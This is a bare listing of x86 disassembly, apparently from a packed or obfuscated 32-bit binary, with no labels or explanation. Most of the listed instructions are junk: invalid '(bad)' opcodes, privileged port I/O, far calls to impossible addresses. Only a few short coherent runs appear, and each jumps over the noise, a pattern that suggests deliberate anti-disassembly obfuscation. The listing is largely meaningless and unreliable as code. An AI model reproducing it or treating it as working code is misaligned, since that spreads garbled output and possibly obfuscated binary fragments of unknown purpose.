  40efbc:	cld    
  40efbd:	push   ss
  40efbe:	adc    edi,edx
  40efc0:	addr16 std 
  40efc2:	gs int3 
  40efc4:	and    dl,BYTE PTR [eax-0x4b]
  40efc7:	jl     0x40eff7
  40efc9:	js     0x40ef84
  40efcb:	arpl   WORD PTR [ecx+0x70],di
  40efce:	pop    eax
  40efcf:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40efd1:	mov    ds:0x7d5bfb69,eax
  40efd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	(bad)  
  40effb:	daa    
  40effc:	mov    dh,0xdf
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	xchg   ecx,eax
  40f007:	scas   al,BYTE PTR es:[edi]
  40f008:	inc    eax
  40f009:	imul   esi,eax,0xffffff96
  40f00c:	les    edx,FWORD PTR [eax+0x37e3f70]
  40f012:	mov    edx,DWORD PTR [ebx-0x53285c53]
  40f018:	add    al,0x94
  40f01a:	(bad)  
  40f01b:	pop    edx
  40f01c:	push   eax
  40f01d:	hlt    
  40f01e:	rcl    BYTE PTR [esi],1
  40f020:	call   0x95282fb5
  40f025:	or     eax,0x2a286576
  40f02a:	dec    edx
  40f02b:	pop    ebx
  40f02c:	test   bl,ch
  40f02e:	popa   
  40f02f:	je     0x40efef
  40f031:	mov    ecx,0x40e5638f
  40f036:	adc    esi,DWORD PTR [esi]
  40f038:	adc    dh,cl
  40f03a:	cmp    ecx,DWORD PTR [edi+0x4e]
  40f03d:	ds inc ebx
  40f03f:	ficom  DWORD PTR [ebx]
  40f041:	in     al,0xbd
  40f043:	dec    eax
  40f044:	imul   ecx,eax,0x4639bdff
  40f04a:	sahf   
  40f04b:	sbb    ebp,DWORD PTR [ebx-0x31b349dc]
  40f051:	hlt    
  40f052:	adc    DWORD PTR [edi-0x57],edi
  40f055:	cmp    BYTE PTR [ecx+0x3e],bh
  40f058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f059:	pop    es
  40f05a:	aas    
  40f05b:	addr16 pop esp
  40f05d:	xor    al,0xed
  40f05f:	fcomip st,st(0)
  40f061:	cmp    bl,BYTE PTR [edi]
  40f063:	mov    edx,edx
  40f065:	aam    0xd5
  40f067:	or     esp,edx
  40f069:	pushf  
  40f06a:	xor    eax,0xf11e4cf6
  40f06f:	gs in  al,0x7d
  40f072:	jge    0x40f016
  40f074:	jp     0x40f0df
  40f076:	or     esi,eax
  40f078:	test   al,0xa7
  40f07a:	jns    0x40f0c1
  40f07c:	int3   
  40f07d:	mov    al,ds:0xd1c43381
  40f082:	dec    ebp
  40f083:	call   0x1688a199
  40f088:	loope  0x40f0ac
  40f08a:	ins    BYTE PTR es:[edi],dx
  40f08b:	or     al,BYTE PTR [edi]
  40f08d:	pop    ss
  40f08e:	sub    DWORD PTR [edi-0x1b],eax
  40f091:	test   eax,0xb022da99
  40f096:	pop    esi
  40f097:	into   
  40f098:	js     0x40f0c2
  40f09a:	es mov eax,0x214f7a28
  40f0a0:	outs   dx,BYTE PTR ds:[esi]
  40f0a1:	jne    0x40f0e2
  40f0a3:	out    dx,eax
  40f0a4:	stos   DWORD PTR es:[edi],eax
  40f0a5:	pop    edi
  40f0a6:	adc    dh,al
  40f0a8:	xor    BYTE PTR [edi],bh
  40f0aa:	faddp  st(0),st
  40f0ac:	adc    BYTE PTR [ecx+ecx*1-0x95330e5],ch
  40f0b3:	push   edi
  40f0b4:	xchg   ebx,eax
  40f0b5:	dec    ebp
  40f0b6:	js     0x40f0ca
  40f0b8:	inc    esp
  40f0b9:	es push edi
  40f0bb:	push   eax
  40f0bc:	xchg   DWORD PTR [ecx-0x4b2cab34],edx
  40f0c2:	cs ror al,1
  40f0c5:	mul    DWORD PTR [ebp-0x552fb3d5]
  40f0cb:	call   0x5495:0x43d280a4
  40f0d2:	leave  
  40f0d3:	aaa    
  40f0d4:	and    DWORD PTR [edx-0xd],ecx
  40f0d7:	inc    ebx
  40f0d8:	and    BYTE PTR [eax-0x18],bl
  40f0db:	mov    dh,0xbd
  40f0dd:	inc    ecx
  40f0de:	imul   ebp,DWORD PTR [edx-0x5ee6aefd],0x713e3a90
  40f0e8:	ins    BYTE PTR es:[edi],dx
  40f0e9:	loopne 0x40f0c5
  40f0eb:	scas   eax,DWORD PTR es:[edi]
  40f0ec:	(bad)  
  40f0ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0ee:	std    
  40f0ef:	fcomi  st,st(5)
  40f0f1:	pop    edi
  40f0f2:	repnz lods eax,DWORD PTR ds:[esi]
  40f0f4:	call   0xd850:0xa0eb7599
  40f0fb:	repz cld 
  40f0fd:	pop    esi
  40f0fe:	cli    
  40f0ff:	cli    
  40f100:	jmp    0x6b943e79
  40f105:	pusha  
  40f106:	imul   ebx,DWORD PTR [edx],0x53
  40f109:	ja     0x40f0ac
  40f10b:	mov    esi,0x9ef33e60
  40f110:	je     0x40f13b
  40f112:	leave  
  40f113:	xchg   ecx,eax
  40f114:	xbegin 0xbe733dcf
  40f11a:	dec    ebx
  40f11b:	push   0xdccc9baa
  40f120:	test   esi,0x7ad3fe74
  40f126:	into   
  40f127:	xor    ecx,edx
  40f129:	xlat   BYTE PTR ds:[ebx]
  40f12a:	outs   dx,DWORD PTR ds:[esi]
  40f12b:	loop   0x40f103
  40f12d:	fisttp WORD PTR [ecx+esi*1]
  40f130:	and    esi,DWORD PTR [esi+0x11]
  40f133:	call   0xe4b8:0x9f584c05
  40f13a:	and    edi,edx
  40f13c:	push   eax
  40f13d:	push   ds
  40f13e:	lea    edx,[esi+0x1c]
  40f141:	push   esp
  40f142:	mov    al,0x43
  40f144:	jl     0x40f0e5
  40f146:	pop    ss
  40f147:	cmp    ah,BYTE PTR [ebp+0x6f6c0d6b]
  40f14d:	push   esp
  40f14e:	outs   dx,BYTE PTR gs:[esi]
  40f150:	inc    edx
  40f151:	push   ss
  40f152:	aas    
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [esi-0x5ca3a5e2],eax
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f166
  40f17a:	push   0xffffffbc
  40f17c:	clc    
  40f17d:	test   BYTE PTR es:[eax+0x35ddde8b],bl
  40f184:	xchg   ebx,eax
  40f185:	stc    
  40f186:	rcr    DWORD PTR [ebx],0xdf
  40f189:	adc    DWORD PTR [ebx-0x5043264],0xffffffe4
  40f190:	sbb    DWORD PTR [ebp-0x511359c9],esp
  40f196:	fistp  QWORD PTR [eax+0x3a39841d]
  40f19c:	scas   al,BYTE PTR es:[edi]
  40f19d:	fisubr WORD PTR [edx+0x4e]
  40f1a0:	sub    BYTE PTR [edx-0x634c022b],ah
  40f1a6:	fnstsw WORD PTR [edi+0x3d22c660]
  40f1ac:	(bad)  [edx]
  40f1ae:	out    dx,al
  40f1af:	stos   BYTE PTR es:[edi],al
  40f1b0:	lods   eax,DWORD PTR ds:[esi]
  40f1b1:	fcom   QWORD PTR ds:0x7ef0bcf2
  40f1b7:	cli    
  40f1b8:	add    eax,0xcc284760
  40f1bd:	mov    cl,0x16
  40f1bf:	fcom   DWORD PTR [esi]
  40f1c1:	mov    ds:0x1dcf5e1a,al
  40f1c6:	clc    
  40f1c7:	sub    eax,0x20ef724f
  40f1cc:	repz jbe 0x40f18a
  40f1cf:	sbb    DWORD PTR ds:0x300c2b1b,ebp
  40f1d5:	in     eax,0xfd
  40f1d7:	sub    cl,al
  40f1d9:	mov    dh,0x91
  40f1db:	mov    BYTE PTR [ecx+esi*1],0x4a
  40f1df:	lods   eax,DWORD PTR ds:[esi]
  40f1e0:	mov    ebx,0x51ff9105
  40f1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1e6:	les    esp,FWORD PTR [ebx+0x2d6ed3c5]
  40f1ec:	retf   
  40f1ed:	cli    
  40f1ee:	pop    ecx
  40f1ef:	int3   
  40f1f0:	xor    DWORD PTR [edx],0xa034fcf2
  40f1f6:	dec    ecx
  40f1f7:	mov    DWORD PTR [edi-0x209308d6],ebx
  40f1fd:	xor    al,0x65
  40f1ff:	es cdq 
  40f201:	lods   eax,DWORD PTR ds:[esi]
  40f202:	outs   dx,DWORD PTR ds:[esi]
  40f203:	cmc    
  40f204:	stc    
  40f205:	xor    eax,edi
  40f207:	mov    eax,ds
  40f209:	inc    eax
  40f20a:	and    al,0xc5
  40f20c:	les    esi,FWORD PTR ds:0x54901ed
  40f212:	rol    cl,0xb
  40f215:	xor    al,0x60
  40f217:	adc    al,0xc9
  40f219:	call   0x74717c7e
  40f21e:	xchg   esp,eax
  40f21f:	pop    ds
  40f220:	out    0x92,eax
  40f222:	sub    bl,BYTE PTR [ebx]
  40f224:	or     BYTE PTR [eax+0x6e8c8e3c],bl
  40f22a:	outs   dx,DWORD PTR ds:[esi]
  40f22b:	aam    0xce
  40f22d:	int3   
  40f22e:	sbb    al,0xa6
  40f230:	add    BYTE PTR [ebx+ebx*4],al
  40f233:	into   
  40f234:	stc    
  40f235:	pop    es
  40f236:	popf   
  40f237:	xor    DWORD PTR [ecx-0x6e],eax
  40f23a:	fldcw  WORD PTR [ebp+0x37]
  40f23d:	inc    edx
  40f23e:	or     DWORD PTR [eax],esp
  40f240:	iret   
  40f241:	lock xchg esp,eax
  40f243:	cmp    eax,0x29eb4c13
  40f248:	fnstenv [esi]
  40f24a:	leave  
  40f24b:	imul   eax,esp,0x3aa9b2ff
  40f251:	jns    0x40f2ca
  40f253:	not    BYTE PTR [ecx+0x50cb9bdc]
  40f259:	mov    bh,0x1d
  40f25b:	and    eax,DWORD PTR [ebx-0x39]
  40f25e:	mov    DWORD PTR [esi+0x3d],ebx
  40f261:	ret    
  40f262:	mov    ebp,0x95f82ab5
  40f267:	jbe    0x40f2d6
  40f269:	retf   
  40f26a:	or     bl,BYTE PTR [edx+0x64c2d388]
  40f270:	xor    eax,DWORD PTR [ecx-0x39f9e9d0]
  40f276:	xchg   DWORD PTR [edx+0x3eddd0de],eax
  40f27c:	dec    ecx
  40f27d:	xor    bl,bh
  40f27f:	dec    ecx
  40f280:	cmp    al,0xd4
  40f282:	dec    edx
  40f283:	sbb    BYTE PTR [edx],0x7c
  40f286:	pop    esi
  40f287:	fsub   DWORD PTR [ebx+0x17afccdc]
  40f28d:	addr16 in eax,dx
  40f28f:	scas   al,BYTE PTR es:[edi]
  40f290:	inc    esp
  40f291:	into   
  40f292:	mov    al,ds:0x5de573f8
  40f297:	dec    edx
  40f298:	in     eax,0xfc
  40f29a:	jo     0x40f22a
  40f29c:	pushf  
  40f29d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f29e:	sbb    cl,BYTE PTR [eax-0x7f0d655a]
  40f2a4:	(bad)  
  40f2a5:	out    0x61,eax
  40f2a7:	jae    0x40f30e
  40f2a9:	loop   0x40f2fc
  40f2ab:	cdq    
  40f2ac:	(bad)  
  40f2ad:	jmp    0xb3bd5a88
  40f2b2:	cmp    BYTE PTR [eax-0x283eb661],bh
  40f2b8:	inc    eax
  40f2b9:	cld    
  40f2ba:	ins    BYTE PTR es:[edi],dx
  40f2bb:	repnz outs dx,BYTE PTR ds:[esi]
  40f2be:	ret    0x6726
  40f2c1:	inc    esp
  40f2c2:	sbb    al,0x98
  40f2c4:	stc    
  40f2c5:	dec    ecx
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rcr    BYTE PTR [eax],1
  40f2f8:	gs loop 0x40f27c
  40f2fb:	jbe    0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f363
  40f304:	fsubr  DWORD PTR [edx-0x7]
  40f307:	xchg   ebp,eax
  40f308:	add    bl,BYTE PTR [ebx+0x22]
  40f30b:	rol    BYTE PTR [edi+0x44],cl
  40f30e:	dec    ebx
  40f30f:	jge    0x40f35e
  40f311:	sbb    ebp,DWORD PTR [ebx]
  40f313:	inc    ebx
  40f314:	mov    edi,DWORD PTR [eax]
  40f316:	fmul   QWORD PTR [ecx+eax*1+0x64]
  40f31a:	push   edi
  40f31b:	popa   
  40f31c:	sbb    BYTE PTR [ebp+0x61],bl
  40f31f:	dec    ecx
  40f320:	sub    bl,0x75
  40f323:	mov    eax,0x5b561ff8
  40f328:	les    ecx,FWORD PTR [ecx+0x24fdf5f9]
  40f32e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f32f:	sub    al,0x36
  40f331:	not    cl
  40f333:	inc    esp
  40f334:	xchg   esi,eax
  40f335:	ss dec esi
  40f337:	in     eax,0x75
  40f339:	in     eax,0xc7
  40f33b:	jne    0x84448756
  40f341:	add    eax,0x1f549a10
  40f346:	jl     0x40f2eb
  40f348:	fild   QWORD PTR [edi-0x98f3ff8]
  40f34e:	inc    eax
  40f34f:	jge    0x40f32f
  40f351:	out    0xa7,al
  40f353:	mov    ebp,DWORD PTR ds:[edi+edi*8+0x7]
  40f358:	enter  0x44b7,0x9b
  40f35c:	jg     0x40f35d
  40f35e:	lahf   
  40f35f:	fldcw  WORD PTR [ebx+0x4b]
  40f362:	and    DWORD PTR [ecx-0x4aa22a2f],edi
  40f368:	push   esp
  40f369:	mov    ch,0x5
  40f36b:	jmp    0xc742c610
  40f370:	cs mov dl,0xcf
  40f373:	inc    esp
  40f374:	stos   DWORD PTR es:[edi],eax
  40f375:	ret    0x71b1
  40f378:	mov    cl,0x5a
  40f37a:	and    ah,BYTE PTR [edi]
  40f37c:	and    cl,BYTE PTR [eax-0x35bc39a]
  40f382:	inc    BYTE PTR es:[esi]
  40f385:	nop
  40f386:	lahf   
  40f387:	es add edi,DWORD PTR ss:[esi]
  40f38b:	pop    ds
  40f38c:	jp     0x40f3f6
  40f38e:	mov    cl,cl
  40f390:	popa   
  40f391:	es stos BYTE PTR es:[edi],al
  40f393:	lahf   
  40f394:	test   eax,0x2e533c84
  40f399:	sar    BYTE PTR [eax*4+0x167d92e],cl
  40f3a0:	pop    ss
  40f3a1:	jns    0x40f397
  40f3a3:	shr    BYTE PTR ds:0x8b1f6c20,1
  40f3a9:	rcl    BYTE PTR [ebp+0x2c287535],1
  40f3af:	sbb    DWORD PTR [ebx+0x1e],eax
  40f3b2:	cld    
  40f3b3:	popa   
  40f3b4:	clc    
  40f3b5:	and    ah,BYTE PTR [eax+0x60]
  40f3b8:	pop    ss
  40f3b9:	add    edi,edx
  40f3bb:	mov    dl,0x3
  40f3bd:	popf   
  40f3be:	(bad)  [edi-0x22751c7f]
  40f3c4:	push   edx
  40f3c5:	in     eax,dx
  40f3c6:	outs   dx,BYTE PTR ds:[esi]
  40f3c7:	fwait
  40f3c8:	aam    0x8f
  40f3ca:	mov    al,0x7
  40f3cc:	jb     0x40f3c7
  40f3ce:	dec    eax
  40f3cf:	bound  edx,QWORD PTR [ecx-0x53830b56]
  40f3d5:	scas   al,BYTE PTR es:[edi]
  40f3d6:	dec    edi
  40f3d7:	jmp    0x3b9c:0x82cf7871
  40f3de:	in     eax,dx
  40f3df:	jmp    0x40f449
  40f3e1:	mov    al,ds:0x662e0554
  40f3e6:	jg     0x40f460
  40f3e8:	rcr    DWORD PTR [ecx],cl
  40f3ea:	int    0x71
  40f3ec:	jns    0x40f426
  40f3ee:	xchg   ebp,eax
  40f3ef:	dec    eax
  40f3f0:	fld    QWORD PTR [eax]
  40f3f2:	mov    ebx,0x675e9d2a
  40f3f7:	add    DWORD PTR ds:0xdfd46b02,ecx
  40f3fd:	jbe    0x40f3c7
  40f3ff:	add    DWORD PTR [ebp-0x16],ecx
  40f402:	add    ch,BYTE PTR [ebp+0x470bea86]
  40f408:	cmp    ecx,eax
  40f40a:	jno    0x40f419
  40f40c:	inc    eax
  40f40d:	push   cs
  40f40e:	push   DWORD PTR [edi-0x39]
  40f411:	dec    edx
  40f412:	(bad)
  40f415:	(bad)  
  40f416:	arpl   sp,dx
  40f418:	pop    ecx
  40f419:	ds lahf 
  40f41b:	pop    edx
  40f41c:	retf   0x1e5f
  40f41f:	inc    ebp
  40f420:	xlat   BYTE PTR ds:[ebx]
  40f421:	adc    eax,0x9f15229f
  40f426:	(bad)  
  40f427:	adc    ebx,ebx
  40f429:	shl    BYTE PTR [eax-0x3d],1
  40f42c:	in     al,dx
  40f42d:	cmp    eax,0x329b5e1c
  40f432:	dec    ecx
  40f433:	paddq  mm7,QWORD PTR ds:0x8a1b9a20
  40f43a:	in     al,dx
  40f43b:	mov    ds:0x2b835b9,eax
  40f440:	pop    eax
  40f441:	inc    edi
  40f442:	mov    eax,0x33a42d9
  40f447:	fld    QWORD PTR ds:0xd9542ff8
  40f44d:	jl     0x40f3e0
  40f44f:	lods   eax,DWORD PTR ds:[esi]
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	sub    cl,al
  40f466:	cs retf 
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	lock addr16 jge 0x40f480
  40f474:	inc    esp
  40f475:	mov    bh,0x2a
  40f477:	ja     0x40f42b
  40f479:	in     al,0x5f
  40f47b:	retf   0xc54b
  40f47e:	je     0x40f4cd
  40f480:	add    bl,ah
  40f482:	stos   DWORD PTR es:[edi],eax
  40f483:	cmp    eax,0xbb0e348e
  40f488:	ret    
  40f489:	inc    edx
  40f48a:	mov    edx,0xef6f78c6
  40f48f:	add    ecx,DWORD PTR [ebx+0x62e7ae0b]
  40f495:	or     ebp,DWORD PTR [ebp+0x2ad6c56c]
  40f49b:	push   ss
  40f49c:	push   0xffffffb4
  40f49e:	sub    eax,0xda63b3c
  40f4a3:	mov    ds:0x52cbd45a,eax
  40f4a8:	lods   al,BYTE PTR ds:[esi]
  40f4a9:	adc    BYTE PTR [esi-0x63],ah
  40f4ac:	aaa    
  40f4ad:	jl     0x40f4f1
  40f4af:	pop    ecx
  40f4b0:	fmul   QWORD PTR [ecx-0x7936da17]
  40f4b6:	mov    DWORD PTR [ebp+0x6e],edi
  40f4b9:	mov    al,0xa7
  40f4bb:	xchg   ecx,eax
  40f4bc:	rol    BYTE PTR [ebx],1
  40f4be:	lods   eax,DWORD PTR ds:[esi]
  40f4bf:	add    BYTE PTR [edx],ch
  40f4c1:	cld    
  40f4c2:	out    0x8,al
  40f4c4:	cmp    ecx,ebx
  40f4c6:	out    0x16,al
  40f4c8:	jge    0x40f4b6
  40f4ca:	popa   
  40f4cb:	inc    ecx
  40f4cc:	mov    dl,BYTE PTR [ecx-0x767acba6]
  40f4d2:	fistp  QWORD PTR [ecx-0x36515451]
  40f4d8:	add    eax,0x3c311bc1
  40f4dd:	adc    eax,0xee74af9b
  40f4e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e3:	and    al,0xcc
  40f4e5:	mov    al,ds:0xa7950677
  40f4ea:	adc    eax,0x7cc60f0c
  40f4ef:	push   ecx
  40f4f0:	add    BYTE PTR [ebx-0x6fc41c9f],0x14
  40f4f7:	jp     0x40f483
  40f4f9:	xlat   BYTE PTR ds:[ebx]
  40f4fa:	sti    
  40f4fb:	dec    edi
  40f4fc:	adc    esi,DWORD PTR [edi]
  40f4fe:	and    al,0x21
  40f500:	int    0xca
  40f502:	and    al,0xcd
  40f504:	jbe    0x40f4b1
  40f506:	gs ret 0x47c2
  40f50a:	pop    ebp
  40f50b:	ftst   
  40f50d:	daa    
  40f50e:	xchg   ebp,eax
  40f50f:	mov    ebx,0x7837317f
  40f514:	cdq    
  40f515:	push   esp
  40f516:	jge    0x40f57e
  40f518:	cwde   
  40f519:	mov    eax,DWORD PTR [esi+0x7c]
  40f51c:	clc    
  40f51d:	pop    ss
  40f51e:	xlat   BYTE PTR ds:[ebx]
  40f51f:	xor    eax,0xcb847fd0
  40f524:	and    bl,BYTE PTR [eax+0x7f3f0f68]
  40f52a:	enter  0x2f58,0x1e
  40f52e:	ret    
  40f52f:	dec    ebp
  40f530:	mov    ebp,0x156fd2fb
  40f535:	xchg   edx,eax
  40f536:	scas   al,BYTE PTR es:[edi]
  40f537:	pushf  
  40f538:	aad    0x7c
  40f53a:	mov    DWORD PTR [esi-0x7a],eax
  40f53d:	dec    edi
  40f53e:	ins    DWORD PTR es:[edi],dx
  40f53f:	test   BYTE PTR [ebp+0x4b8f01ec],bl
  40f545:	and    DWORD PTR [eax+0x2],ecx
  40f548:	repnz rol DWORD PTR [edx-0x49],cl
  40f54c:	arpl   WORD PTR [ebp+0x9],bp
  40f54f:	pusha  
  40f550:	imul   eax,DWORD PTR [edi],0xffffff92
  40f553:	mov    ds:0xd44d7909,eax
  40f558:	imul   edi,DWORD PTR [edi],0xe9622f98
  40f55e:	test   DWORD PTR [ecx+0x7ab88b9],ebp
  40f564:	jb     0x40f596
  40f566:	mov    dh,0xd3
  40f568:	adc    dh,0x12
  40f56b:	pop    ecx
  40f56c:	push   ebp
  40f56d:	sar    esp,1
  40f56f:	pop    DWORD PTR [eax+0x7b]
  40f572:	addr16 inc ecx
  40f574:	pop    ds
  40f575:	pop    esi
  40f576:	lahf   
  40f577:	loop   0x40f563
  40f579:	rcr    DWORD PTR [ebp+0x1cdf93d0],cl
  40f57f:	jb     0x40f5a3
  40f581:	push   es
  40f582:	mov    esi,0x3d7ceee6
  40f587:	push   edx
  40f588:	(bad)  [edi]
  40f58a:	out    dx,al
  40f58b:	and    eax,0xc1759fb3
  40f590:	xchg   esp,eax
  40f591:	popf   
  40f592:	ins    BYTE PTR es:[edi],dx
  40f593:	pop    ss
  40f594:	imul   al
  40f596:	inc    edi
  40f597:	in     al,dx
  40f598:	pop    esp
  40f599:	les    eax,FWORD PTR [ebx]
  40f59b:	dec    esi
  40f59c:	shl    edx,0x95
  40f59f:	or     BYTE PTR [esi+0x7ffb0482],dh
  40f5a5:	mov    edi,0xfd55a415
  40f5aa:	ret    0x4117
  40f5ad:	dec    BYTE PTR [edx+0x32cb4583]
  40f5b3:	enter  0xe4bc,0x20
  40f5b7:	cld    
  40f5b8:	jae    0x40f5c0
  40f5ba:	pop    esp
  40f5bb:	cdq    
  40f5bc:	mov    ds:0x408b008b,al
  40f5c1:	cmp    al,0x8d
  40f5c3:	or     al,0xcd
  40f5c5:	js     0x40f5c7
  40f5c7:	add    BYTE PTR [eax],al
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	jp     0x40f609
  40f605:	sub    ch,bl
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	fnstenv [esi+0x45160be4]
  40f615:	leave  
  40f616:	pslld  mm2,QWORD PTR [eax-0x62b0d59e]
  40f61d:	pop    esi
  40f61e:	test   al,cl
  40f620:	cmp    bh,bh
  40f622:	sub    BYTE PTR [edi-0xa],dl
  40f625:	in     al,0x7b
  40f627:	xor    DWORD PTR [edi+0x627f8667],eax
  40f62d:	mov    edx,0x484fc5e
  40f632:	dec    ebp
  40f633:	js     0x40f691
  40f635:	(bad)  
  40f636:	clc    
  40f637:	call   0x8cd9f2a1
  40f63c:	je     0x40f6a5
  40f63e:	pop    es
  40f63f:	daa    
  40f640:	add    BYTE PTR [edi-0x1d],bh
  40f643:	mov    esi,0x3df90f42
  40f648:	call   0x4a191202
  40f64d:	push   edx
  40f64e:	je     0x40f6c3
  40f650:	xchg   BYTE PTR [ebx+0x61],ch
  40f653:	push   ebx
  40f654:	cmp    dl,BYTE PTR [eax+edx*4]
  40f657:	shld   DWORD PTR [eax],edi,cl
  40f65a:	xchg   DWORD PTR [edi+0x67],edx
  40f65d:	xor    esi,DWORD PTR [esi]
  40f65f:	ret    0xfc81
  40f662:	sbb    ebp,edx
  40f664:	and    dl,cl
  40f666:	mov    edi,0x366b38af
  40f66b:	and    eax,0x88ab7a80
  40f670:	stos   BYTE PTR es:[edi],al
  40f671:	push   cs
  40f672:	rcl    BYTE PTR [esi+0x50],0x80
  40f676:	jnp    0x40f65c
  40f678:	bnd jle 0x40f65e
  40f67b:	fwait
  40f67c:	sbb    ch,BYTE PTR ds:0x8afbdf2d
  40f682:	js     0x40f64f
  40f684:	mov    ds:0x92ba429e,al
  40f689:	mov    eax,ds:0x2618e22c
  40f68e:	and    al,BYTE PTR [edx]
  40f690:	adc    DWORD PTR fs:[ebp+0x1d8ca65a],ebx
  40f697:	mov    ah,0x3f
  40f699:	pop    ds
  40f69a:	rol    BYTE PTR [ebx+0x5d43f69e],cl
  40f6a0:	jb     0x40f706
  40f6a2:	xchg   BYTE PTR [ebp+0x72],ch
  40f6a5:	in     eax,dx
  40f6a6:	jne    0x40f68e
  40f6a8:	pop    edx
  40f6a9:	(bad)  
  40f6aa:	mov    BYTE PTR [ebx+0x69bedec],ah
  40f6b0:	or     eax,0x9f253264
  40f6b5:	and    BYTE PTR [esi-0x7f],ah
  40f6b8:	stos   BYTE PTR es:[edi],al
  40f6b9:	fcomp  st(3)
  40f6bb:	and    DWORD PTR [ebp-0x56710c30],eax
  40f6c1:	mov    ecx,0xb7bffea5
  40f6c6:	scas   eax,DWORD PTR es:[edi]
  40f6c7:	inc    esi
  40f6c8:	add    cl,BYTE PTR [edx+0x82b1e0]
  40f6ce:	in     al,dx
  40f6cf:	sbb    DWORD PTR [esi+esi*2-0x51],esi
  40f6d3:	mov    ds:0x6af1bdbd,eax
  40f6d8:	or     bl,BYTE PTR [ecx-0x450174ce]
  40f6de:	je     0x40f728
  40f6e0:	cmp    BYTE PTR [edx],ch
  40f6e2:	push   0xed42160c
  40f6e7:	adc    DWORD PTR [esi],0xb5242a3a
  40f6ed:	or     edx,DWORD PTR [edi-0x54]
  40f6f0:	add    DWORD PTR [edx+0x9],edx
  40f6f3:	mov    dh,0x5f
  40f6f5:	or     eax,0xcc2d9c7a
  40f6fa:	lods   eax,DWORD PTR ds:[esi]
  40f6fb:	xchg   ebx,eax
  40f6fc:	fisubr DWORD PTR [edi+0x745b80ff]
  40f702:	add    bl,BYTE PTR [esi-0x77a618a0]
  40f708:	cmc    
  40f709:	adc    ecx,DWORD PTR [edx+ebx*1]
  40f70c:	mov    ah,0xf4
  40f70e:	dec    esi
  40f70f:	push   es
  40f710:	cmc    
  40f711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f712:	inc    esp
  40f713:	loopne 0x40f6f7
  40f715:	jns    0x40f774
  40f717:	jbe    0x40f717
  40f719:	xchg   esi,eax
  40f71a:	inc    edi
  40f71b:	add    BYTE PTR [edx-0x4c],dl
  40f71e:	icebp  
  40f71f:	cmp    al,0x48
  40f721:	int    0x55
  40f723:	(bad)  
  40f726:	in     eax,dx
  40f727:	adc    DWORD PTR [ebp+0x61],esp
  40f72a:	ror    BYTE PTR [esi],cl
  40f72c:	daa    
  40f72d:	and    eax,0x3cd1ca1d
  40f732:	sar    BYTE PTR ds:[ebp+0x76806e5],0x6
  40f73a:	xor    eax,0x6d43d82a
  40f73f:	sub    esp,DWORD PTR [edx+0x2c]
  40f742:	mov    ds:0x376aa57c,al
  40f747:	and    al,0x1
  40f749:	test   bl,0x16
